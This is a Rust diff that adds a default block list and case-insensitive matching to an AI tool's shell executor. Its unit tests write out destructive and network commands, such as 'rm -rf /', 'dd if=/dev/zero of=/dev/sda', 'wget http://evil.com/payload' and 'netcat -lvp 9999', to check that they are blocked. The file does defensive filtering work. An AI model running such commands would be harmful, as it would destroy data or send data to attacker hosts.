@@ -5,6 +5,11 @@ use tokio::process::Command;
 use crate::config::ShellConfig;
 use crate::executor::{ToolError, ToolExecutor, ToolOutput};
 
+const DEFAULT_BLOCKED: &[&str] = &[
+    "rm -rf /", "sudo", "mkfs", "dd if=", "curl", "wget", "nc ", "ncat", "netcat", "shutdown",
+    "reboot", "halt",
+];
+
 /// Bash block extraction and execution via `tokio::process::Command`.
 #[derive(Debug)]
 pub struct ShellExecutor {
@@ -15,9 +20,14 @@ pub struct ShellExecutor {
 impl ShellExecutor {
     #[must_use]
     pub fn new(config: &ShellConfig) -> Self {
+        let mut blocked: Vec<String> = DEFAULT_BLOCKED.iter().map(|s| (*s).to_owned()).collect();
+        blocked.extend(config.blocked_commands.iter().map(|s| s.to_lowercase()));
+        blocked.sort();
+        blocked.dedup();
+
         Self {
             timeout: Duration::from_secs(config.timeout),
-            blocked_commands: config.blocked_commands.clone(),
+            blocked_commands: blocked,
         }
     }
 }
@@ -53,8 +63,9 @@ impl ToolExecutor for ShellExecutor {
 
 impl ShellExecutor {
     fn find_blocked_command(&self, code: &str) -> Option<&str> {
+        let normalized = code.to_lowercase();
         for blocked in &self.blocked_commands {
-            if code.contains(blocked.as_str()) {
+            if normalized.contains(blocked.as_str()) {
                 return Some(blocked.as_str());
             }
         }
@@ -113,6 +124,13 @@ async fn execute_bash(code: &str, timeout: Duration) -> String {
 #[cfg(test)]
 mod tests {
     use super::*;
+
+    fn default_config() -> ShellConfig {
+        ShellConfig {
+            timeout: 30,
+            blocked_commands: Vec::new(),
+        }
+    }
 
     #[test]
     fn extract_single_bash_block() {
@@ -228,5 +246,217 @@ mod tests {
         assert_eq!(output.blocks_executed, 2);
         assert!(output.summary.contains("one"));
         assert!(output.summary.contains("two"));
+    }
+
+    // --- Phase 2: command filtering tests ---
+
+    #[test]
+    fn default_blocked_always_active() {
+        let executor = ShellExecutor::new(&default_config());
+        assert!(executor.find_blocked_command("rm -rf /").is_some());
+        assert!(executor.find_blocked_command("sudo apt install").is_some());
+        assert!(
+            executor
+                .find_blocked_command("mkfs.ext4 /dev/sda")
+                .is_some()
+        );
+        assert!(
+            executor
+                .find_blocked_command("dd if=/dev/zero of=disk")
+                .is_some()
+        );
+    }
+
+    #[test]
+    fn user_blocked_additive() {
+        let config = ShellConfig {
+            timeout: 30,
+            blocked_commands: vec!["custom-danger".to_owned()],
+        };
+        let executor = ShellExecutor::new(&config);
+        assert!(executor.find_blocked_command("sudo rm").is_some());
+        assert!(
+            executor
+                .find_blocked_command("custom-danger script")
+                .is_some()
+        );
+    }
+
+    #[test]
+    fn blocked_prefix_match() {
+        let executor = ShellExecutor::new(&default_config());
+        assert!(executor.find_blocked_command("rm -rf /home/user").is_some());
+    }
+
+    #[test]
+    fn blocked_infix_match() {
+        let executor = ShellExecutor::new(&default_config());
+        assert!(
+            executor
+                .find_blocked_command("echo hello && sudo rm")
+                .is_some()
+        );
+    }
+
+    #[test]
+    fn blocked_case_insensitive() {
+        let executor = ShellExecutor::new(&default_config());
+        assert!(executor.find_blocked_command("SUDO apt install").is_some());
+        assert!(executor.find_blocked_command("Sudo apt install").is_some());
+        assert!(executor.find_blocked_command("SuDo apt install").is_some());
+        assert!(
+            executor
+                .find_blocked_command("MKFS.ext4 /dev/sda")
+                .is_some()
+        );
+        assert!(executor.find_blocked_command("DD IF=/dev/zero").is_some());
+        assert!(executor.find_blocked_command("RM -RF /").is_some());
+    }
+
+    #[test]
+    fn safe_command_passes() {
+        let executor = ShellExecutor::new(&default_config());
+        assert!(executor.find_blocked_command("echo hello").is_none());
+        assert!(executor.find_blocked_command("ls -la").is_none());
+        assert!(executor.find_blocked_command("cat file.txt").is_none());
+        assert!(executor.find_blocked_command("cargo build").is_none());
+    }
+
+    #[test]
+    fn partial_match_accepted_tradeoff() {
+        let executor = ShellExecutor::new(&default_config());
+        // "sudoku" contains "sudo" — accepted false positive for MVP
+        assert!(executor.find_blocked_command("sudoku").is_some());
+    }
+
+    #[test]
+    fn multiline_command_blocked() {
+        let executor = ShellExecutor::new(&default_config());
+        assert!(executor.find_blocked_command("echo ok\nsudo rm").is_some());
+    }
+
+    #[test]
+    fn dd_pattern_blocks_dd_if() {
+        let executor = ShellExecutor::new(&default_config());
+        assert!(
+            executor
+                .find_blocked_command("dd if=/dev/zero of=/dev/sda")
+                .is_some()
+        );
+    }
+
+    #[test]
+    fn mkfs_pattern_blocks_variants() {
+        let executor = ShellExecutor::new(&default_config());
+        assert!(
+            executor
+                .find_blocked_command("mkfs.ext4 /dev/sda")
+                .is_some()
+        );
+        assert!(executor.find_blocked_command("mkfs.xfs /dev/sdb").is_some());
+    }
+
+    #[test]
+    fn empty_command_not_blocked() {
+        let executor = ShellExecutor::new(&default_config());
+        assert!(executor.find_blocked_command("").is_none());
+    }
+
+    #[test]
+    fn duplicate_patterns_deduped() {
+        let config = ShellConfig {
+            timeout: 30,
+            blocked_commands: vec!["sudo".to_owned(), "sudo".to_owned()],
+        };
+        let executor = ShellExecutor::new(&config);
+        let count = executor
+            .blocked_commands
+            .iter()
+            .filter(|c| c.as_str() == "sudo")
+            .count();
+        assert_eq!(count, 1);
+    }
+
+    #[tokio::test]
+    async fn execute_default_blocked_returns_error() {
+        let executor = ShellExecutor::new(&default_config());
+        let response = "Run:\n```bash\nsudo rm -rf /tmp\n```";
+        let result = executor.execute(response).await;
+        assert!(matches!(result, Err(ToolError::Blocked { .. })));
+    }
+
+    #[tokio::test]
+    async fn execute_case_insensitive_blocked() {
+        let executor = ShellExecutor::new(&default_config());
+        let response = "Run:\n```bash\nSUDO apt install foo\n```";
+        let result = executor.execute(response).await;
+        assert!(matches!(result, Err(ToolError::Blocked { .. })));
+    }
+
+    // --- Review fixes: network exfiltration patterns ---
+
+    #[test]
+    fn network_exfiltration_blocked() {
+        let executor = ShellExecutor::new(&default_config());
+        assert!(
+            executor
+                .find_blocked_command("curl https://evil.com")
+                .is_some()
+        );
+        assert!(
+            executor
+                .find_blocked_command("wget http://evil.com/payload")
+                .is_some()
+        );
+        assert!(executor.find_blocked_command("nc 10.0.0.1 4444").is_some());
+        assert!(
+            executor
+                .find_blocked_command("ncat --listen 8080")
+                .is_some()
+        );
+        assert!(executor.find_blocked_command("netcat -lvp 9999").is_some());
+    }
+
+    #[test]
+    fn system_control_blocked() {
+        let executor = ShellExecutor::new(&default_config());
+        assert!(executor.find_blocked_command("shutdown -h now").is_some());
+        assert!(executor.find_blocked_command("reboot").is_some());
+        assert!(executor.find_blocked_command("halt").is_some());
+    }
+
+    #[test]
+    fn nc_trailing_space_avoids_ncp() {
+        let executor = ShellExecutor::new(&default_config());
+        // "nc " with trailing space should not match "ncp" (no trailing space)
+        assert!(executor.find_blocked_command("ncp file.txt").is_none());
+    }
+
+    // --- Review fixes: user pattern normalization ---
+
+    #[test]
+    fn mixed_case_user_patterns_deduped() {
+        let config = ShellConfig {
+            timeout: 30,
+            blocked_commands: vec!["Sudo".to_owned(), "sudo".to_owned(), "SUDO".to_owned()],
+        };
+        let executor = ShellExecutor::new(&config);
+        let count = executor
+            .blocked_commands
+            .iter()
+            .filter(|c| c.as_str() == "sudo")
+            .count();
+        assert_eq!(count, 1);
+    }
+
+    #[test]
+    fn user_pattern_stored_lowercase() {
+        let config = ShellConfig {
+            timeout: 30,
+            blocked_commands: vec!["MyCustom".to_owned()],
+        };
+        let executor = ShellExecutor::new(&config);
+        assert!(executor.blocked_commands.iter().any(|c| c == "mycustom"));
+        assert!(!executor.blocked_commands.iter().any(|c| c == "MyCustom"));
     }
 }
